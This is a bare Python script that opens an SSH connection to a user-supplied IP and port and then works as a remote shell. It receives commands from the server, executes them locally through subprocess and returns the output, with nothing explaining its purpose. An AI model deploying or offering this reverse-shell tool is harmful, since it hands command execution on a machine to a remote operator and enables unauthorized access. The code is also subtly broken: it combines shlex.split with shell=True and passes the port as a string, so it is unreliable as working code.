import paramiko
import shlex
import subprocess

def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)
    
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command.encode())
        print(ssh_session.recv(1024).decode())
        while True:
            command = ssh_session.recv(1024)
            if not command:
                break
            try:
                cmd = command.decode().strip()
                if cmd == 'exit':
                    client.close()
                    break
                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)
                ssh_session.send(cmd_output or b'okay')
            except Exception as e:
                ssh_session.send(str(e).encode())
        client.close()
    return

if __name__ == '__main__':
    import getpass
    user = getpass.getuser()
    password = getpass.getpass()
    
    ip = input('Enter server IP: ')
    port = input('Enter port: ')
    ssh_command(ip, port, user, password, 'ClientConnected')